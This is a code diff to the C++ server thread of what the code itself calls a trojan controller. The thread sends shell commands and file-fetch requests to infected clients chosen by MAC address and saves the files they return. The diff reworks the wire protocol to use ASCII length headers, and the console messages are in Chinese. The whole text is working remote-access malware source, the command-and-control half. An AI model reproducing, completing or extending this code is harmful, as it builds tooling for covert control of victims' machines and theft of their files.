@@ -321,7 +321,6 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 	int Ret = 0;
 	char RecvBuffer[MAX_PATH];
 	int CmdNo;
-	DWORD CmdLen;
 	int cmdlen;
 	char CmdBuff[MAX_CMD_LEN];
 	char LocalFile[MAX_PATH];
@@ -382,25 +381,26 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 		int invfilelen, filelen;
 		int recvbuflen = 2*DEFAULT_BUFLEN;
 		int iResult;
+		char lenchar[MAC_ADDR_LEN];
 
 		switch(CmdNo)
 		{
 		case CMD_NULL:
 			//cout << "暂时未发送命令！\n";
-			CmdLen = 0;
-			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
-			//Ret = send(ClientSocket, combine(protocolHead, (char *)&CmdLen), strlen(protocolHead)+ sizeof(DWORD), 0);
-			if (Ret>0) cout << "发送的是一条空指令！" << endl;
+			//send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
+			sprintf(lenchar, "%d", 0);
+			iResult = send(ClientSocket, combine(protocolHead, lenchar), MAC_ADDR_LEN + POST_LEN, 0);
+			if (Ret>0) cout << "你可以随时输入任意客户端的Mac地址发送指令！" << endl;
 			
 			break;
 		case CMD_CMD:
 			cout << "执行命令" << CmdBuff << endl;
 			cout << "命令长度为" << strlen(CmdBuff) << "!\n";
-			CmdLen = htonl(strlen(CmdBuff));
 			cmdlen = strlen(CmdBuff);
 			// send cmd len
-			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
-			//Ret = send(ClientSocket, combine(protocolHead, (char *)cmdlen), strlen(protocolHead)+ sizeof(char *), 0);
+			//send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
+			sprintf(lenchar, "%d", cmdlen);
+			iResult = send(ClientSocket, combine(protocolHead, lenchar), MAC_ADDR_LEN + POST_LEN, 0);
 			// send cmd content
 			//send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
 			Ret = send(ClientSocket, combine(protocolHead, CmdBuff), strlen(protocolHead)+ strlen(CmdBuff), 0);
@@ -416,21 +416,19 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 
 			// reset cmd information
 			CmdBuff[strTmp-CmdBuff] = '\0';
-			CmdLen = htonl(strlen(CmdBuff));
 			cout << "目标文件为" << CmdBuff << endl;
 			// send cmd len
-			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
+			sprintf(lenchar, "%d", strlen(CmdBuff));
+			iResult = send(ClientSocket, combine(protocolHead, lenchar), MAC_ADDR_LEN + POST_LEN, 0);
 			// send cmd content
 			//send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
 			Ret = send(ClientSocket, combine(protocolHead, CmdBuff), strlen(protocolHead) + strlen(CmdBuff), 0);
 			// recv file from trojan
 
-			iResult = recv(ClientSocket, recvbuf, sizeof(char *), 0);
+			iResult = recv(ClientSocket, recvbuf, MAC_ADDR_LEN + POST_LEN, 0);
 			if (iResult >0)
 			{
-				invfilelen = *((int *)recvbuf);
-				cout << "数据长度的网络字节序为  " << invfilelen << endl;
-				filelen = ntohl(invfilelen);
+				filelen = atoi(killhead(recvbuf));
 				cout << "数据长度为  " << filelen << endl;
 			}
 			file = fopen(filename, "wb+");
